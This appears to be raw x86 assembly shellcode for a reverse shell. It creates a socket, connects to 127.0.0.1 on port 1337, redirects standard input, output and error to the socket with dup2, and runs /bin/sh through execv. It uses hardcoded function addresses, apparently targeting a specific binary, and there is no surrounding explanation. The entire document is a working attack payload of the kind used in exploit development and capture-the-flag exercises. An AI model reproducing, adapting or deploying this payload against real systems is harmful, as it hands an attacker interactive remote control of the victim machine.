sub esp, 0xfff
lea ecx,[esp+0x4]
and esp,0xfffffff0
push DWORD PTR [ecx-0x4]
push ebp
mov ebp, esp
push ebx
push ecx
sub esp, 0x30

and ebx, 0x2e20
sub esp, 0x4
push 0x0
push 0x1
push 0x2
mov edx, 0x8048730 # socket address
call edx # call socket
add esp, 0x10
mov DWORD PTR [ebp-0xc], eax
lea eax,[ebp-0x1c]
mov DWORD PTR [eax],0x0
mov DWORD PTR [eax+0x4],0x0
mov DWORD PTR [eax+0x8],0x0
mov DWORD PTR [eax+0xc],0x0
mov WORD PTR [ebp-0x1c],0x2
mov DWORD PTR [ebp-0x18],0x100007f
mov WORD PTR [ebp-0x1a],0x3905
sub esp, 0x4
push 0x10
lea eax,[ebp-0x1c]
push eax
push DWORD PTR [ebp-0xc]
mov edx, 0x8048750 # connect address
call edx # call connect
add esp,0x10
sub esp,0x8
push 0x0
push DWORD PTR [ebp-0xc]
mov edi, 0x8048600 # dup2 address
call edi # call dup2
add esp,0x10
sub esp,0x8
push 0x1
push DWORD PTR [ebp-0xc]
call edi # call dup2
add esp,0x10
sub esp,0x8
push 0x2
push DWORD PTR [ebp-0xc]
call edi # call dup2
add esp,0x10
sub esp,0x8
push 0x0 # NULL - second arg
jmp _WANT_BIN_BASH
_GOT_BIN_BASH:
mov edx, 0x80486d0 # execv address
call edx # call execv
add esp,0x10
mov eax,0x0
lea esp,[ebp-0x8]
pop ecx
pop ebx
pop ebp
lea esp,[ecx-0x4]
ret
_WANT_BIN_BASH:
call _GOT_BIN_BASH
.STRING "/bin/sh"
